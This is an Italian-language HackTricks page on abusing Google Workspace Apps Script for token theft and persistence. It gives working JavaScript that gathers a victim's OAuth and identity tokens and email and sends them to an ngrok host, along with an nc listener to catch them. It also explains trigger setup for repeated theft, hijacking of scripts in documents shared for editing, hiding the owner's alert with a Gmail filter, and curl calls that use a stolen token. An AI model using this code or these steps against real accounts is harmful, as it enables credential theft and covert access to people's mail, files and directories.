# GWS - App Scripts

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## App Scripts

App Scripts √® **codice che verr√† attivato quando un utente con permessi di modifica accede al documento a cui √® collegato l'App Script** e dopo **aver accettato il prompt OAuth**.\
Possono anche essere impostati per essere **eseguiti ogni certo tempo** dal proprietario dell'App Script (Persistenza).

### Create App Script

Ci sono diversi modi per creare un App Script, anche se i pi√π comuni sono f**orm un Google Document (di qualsiasi tipo)** e come **progetto autonomo**:

<details>

<summary>Create a container-bound project from Google Docs, Sheets, or Slides</summary>

1. Apri un documento Docs, un foglio di calcolo Sheets o una presentazione Slides.
2. Clicca su **Estensioni** > **Google Apps Script**.
3. Nell'editor di script, clicca su **Progetto senza titolo**.
4. Dai un nome al tuo progetto e clicca su **Rinomina**.

</details>

<details>

<summary>Create a standalone project</summary>

Per creare un progetto autonomo da Apps Script:

1. Vai su [`script.google.com`](https://script.google.com/).
2. Clicca su **Nuovo Progetto**.
3. Nell'editor di script, clicca su **Progetto senza titolo**.
4. Dai un nome al tuo progetto e clicca su **Rinomina**.

</details>

<details>

<summary>Create a standalone project from Google Drive</summary>

1. Apri [Google Drive](https://drive.google.com/).
2. Clicca su **Nuovo** > **Altro** > **Google Apps Script**.

</details>

<details>

<summary>Create a container-bound project from Google Forms</summary>

1. Apri un modulo in Google Forms.
2. Clicca su Altro more\_vert > **Editor di script**.
3. Nell'editor di script, clicca su **Progetto senza titolo**.
4. Dai un nome al tuo progetto e clicca su **Rinomina**.

</details>

<details>

<summary>Create a standalone project using the clasp command line tool</summary>

`clasp` √® uno strumento da riga di comando che ti consente di creare, estrarre/inviare e distribuire progetti Apps Script da un terminale.

Vedi la [Guida all'interfaccia della riga di comando usando `clasp`](https://developers.google.com/apps-script/guides/clasp) per ulteriori dettagli.

</details>

## App Script Scenario <a href="#create-using-clasp" id="create-using-clasp"></a>

### Create Google Sheet with App Script

Inizia creando un App Script, la mia raccomandazione per questo scenario √® di creare un Google Sheet e andare su **`Estensioni > App Scripts`**, questo aprir√† un **nuovo App Script per te collegato al foglio**.

### Leak token

Per dare accesso al token OAuth devi cliccare su **`Servizi +` e aggiungere ambiti come**:

* **AdminDirectory**: Accesso a utenti e gruppi della directory (se l'utente ha abbastanza permessi)
* **Gmail**: Per accedere ai dati di gmail
* **Drive**: Per accedere ai dati di drive
* **Google Sheets API**: Affinch√© funzioni con il trigger

Per cambiare tu stesso i **scopi necessari** puoi andare nelle impostazioni del progetto e abilitare: **`Mostra il file di manifest "appsscript.json" nell'editor`.**

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Per catturare la richiesta puoi semplicemente eseguire:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Permissions requested to execute the App Script:

<figure><img src="../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Poich√© viene effettuata una richiesta esterna, il prompt OAuth **chieder√† anche il permesso di raggiungere endpoint esterni**.
{% endhint %}

### Create Trigger

Una volta letta l'App, clicca su **‚è∞ Triggers** per creare un trigger. Come **funzione** da eseguire scegli **`getToken`**, eseguito al deployment **`Head`**, nella sorgente evento seleziona **`From spreadsheet`** e tipo di evento seleziona **`On open`** o **`On edit`** (secondo le tue esigenze) e salva.

Nota che puoi controllare i **runs degli App Scripts nella scheda Esecuzioni** se vuoi fare debug di qualcosa.

### Sharing

Per **triggerare** l'**App Script** la vittima deve connettersi con **Accesso Editor**.

{% hint style="success" %}
Il **token** utilizzato per eseguire l'**App Script** sar√† quello del **creatore del trigger**, anche se il file √® aperto come Editor da altri utenti.
{% endhint %}

### Abusing Shared With Me documents

{% hint style="danger" %}
Se qualcuno ti **ha condiviso un documento con App Scripts e un trigger utilizzando il Head** dell'App Script (non un deployment fisso), puoi modificare il codice dell'App Script (aggiungendo ad esempio le funzioni per rubare il token), accedervi, e l'**App Script verr√† eseguito con i permessi dell'utente che ha condiviso il documento con te**! (nota che il token OAuth del proprietario avr√† come scope di accesso quelli dati quando √® stato creato il trigger).

Una **notifica verr√† inviata al creatore dello script indicando che qualcuno ha modificato lo script** (Che ne dici di usare i permessi di gmail per generare un filtro per prevenire l'allerta?)
{% endhint %}

{% hint style="success" %}
Se un **attaccante modifica gli scope dell'App Script** gli aggiornamenti **non verranno applicati** al documento fino a quando non viene creato un **nuovo trigger** con le modifiche. Pertanto, un attaccante non sar√† in grado di rubare il token del proprietario creatore con pi√π scope di quelli impostati nel trigger che ha creato.
{% endhint %}

### Copying instead of sharing

Quando crei un link per condividere un documento, viene creato un link simile a questo: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Se **cambi** la parte finale **"/edit"** in **"/copy"**, invece di accedervi, google ti chieder√† se vuoi **generare una copia del documento:**

<figure><img src="../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

Se l'utente lo copia e accede, sia i **contenuti del documento che gli App Scripts verranno copiati**, tuttavia i **triggers non lo sono**, quindi **niente verr√† eseguito**.

### Sharing as Web Application

Nota che √® anche possibile **condividere un App Script come un'applicazione Web** (nell'Editor dell'App Script, distribuisci come applicazione Web), ma apparir√† un avviso come questo:

<figure><img src="../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

Seguito dal **tipico prompt OAuth che chiede** i permessi necessari.

### Testing

Puoi testare un token raccolto per elencare le email con:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Elenca il calendario dell'utente:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script come Persistenza

Una opzione per la persistenza sarebbe **creare un documento e aggiungere un trigger per la funzione getToken** e condividere il documento con l'attaccante in modo che ogni volta che l'attaccante apre il file, **esfiltri il token della vittima.**

√à anche possibile creare un App Script e farlo attivare ogni X tempo (come ogni minuto, ora, giorno...). Un attaccante che ha **compromesso le credenziali o una sessione di una vittima potrebbe impostare un trigger temporale per l'App Script e leakare un token OAuth molto privilegiato ogni giorno**:

Basta creare un App Script, andare su Trigger, cliccare su Aggiungi Trigger e selezionare come sorgente evento Time-driven e selezionare le opzioni che meglio si adattano a te:

<figure><img src="../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Questo creer√† un'email di avviso di sicurezza e un messaggio push sul tuo cellulare che ti avvisa di questo.
{% endhint %}

### Bypass della Finestra di Conferma Non Verificata per Documenti Condivisi

Inoltre, se qualcuno ti ha **condiviso** un documento con **accesso in modifica**, puoi generare **App Scripts all'interno del documento** e il **PROPRIETARIO (creatore) del documento sar√† il proprietario dell'App Script**.

{% hint style="warning" %}
Questo significa che il **creatore del documento apparir√† come creatore di qualsiasi App Script** che chiunque con accesso in modifica crea al suo interno.

Questo significa anche che l'**App Script sar√† fidato dall'ambiente Workspace** del creatore del documento.
{% endhint %}

{% hint style="danger" %}
Questo significa anche che se un **App Script esisteva gi√†** e le persone hanno **concesso accesso**, chiunque con permesso di **Modifica** sul documento pu√≤ **modificarlo e abusare di quell'accesso.**\
Per abusare di questo hai anche bisogno che le persone attivino l'App Script. E un trucco interessante √® **pubblicare lo script come un'app web**. Quando le **persone** che hanno gi√† concesso **accesso** all'App Script accedono alla pagina web, **attiveranno l'App Script** (questo funziona anche usando i tag `<img>`).
{% endhint %}

{% hint style="success" %}
Impara e pratica Hacking AWS:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Impara e pratica Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>
{% endhint %}
